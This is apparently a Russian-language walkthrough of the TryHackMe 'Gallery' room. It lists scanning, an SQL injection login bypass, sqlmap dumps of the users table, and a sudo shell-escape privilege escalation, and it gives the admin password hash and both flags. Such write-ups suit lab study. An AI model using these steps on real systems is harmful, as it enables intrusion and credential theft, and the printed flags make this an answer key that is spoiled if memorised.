[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Gallery](https://tryhackme.com/r/room/gallery666) 

Всего 2 задания:
## Задание 1
Наша галерея не очень хорошо охраняется.

Разработано и создано  Микаа  !

### Ответьте на вопросы ниже
Сколько портов открыто?
```commandline
nmap -sC -sV <IP>
```
```commandline
2
```
Как называется CMS?
```commandline
gobuster dir -u <IP> -w /opt/medium.txt
http://<IP>/gallery/login.php
```
```commandline
Simple Image Gallery
```
Какой хеш-пароль у пользователя admin?
```commandline
'or 1=1 -- -
sudo sqlmap -r test.req --dbs
sqlmap -r test.req --current-db gallery_db --tables
sqlmap -r test.req --current-db gallery_db -T users --columns
sqlmap -r test.req --current-db gallery_db -T users -C username,password --dump
```
```commandline
a228b12a08b6527e7978cbe5d914531c
```
Что такое флаг пользователя?
```commandline
searchsploit Simple Image Gallery
cat .bash_history
su mike
cat user.txt
```
```commandline
THM{af05cd30bfed67849befd546ef}
```

## Задание 2
Удачи на последнем этапе!
### Ответьте на вопросы ниже
Что такое корневой флаг?
```commandline
sudo -l
cat /opt/rootkit.sh
sudo /bin/bash /opt/rootkit.sh
^R^X
reset; sh 1>&0 2>&0
id
cat /root/root.txt
```
```commandline
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)